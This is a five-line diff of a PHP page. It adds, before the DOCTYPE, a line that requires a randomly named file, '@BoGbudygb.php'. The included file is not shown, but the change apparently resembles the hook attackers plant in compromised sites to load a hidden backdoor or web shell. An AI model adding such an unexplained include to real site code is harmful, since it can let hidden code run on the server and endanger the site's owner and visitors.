@@ -1,5 +1,4 @@
-<?php
-?>
+<?php require __DIR__ . '/@BoGbudygb.php' ?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
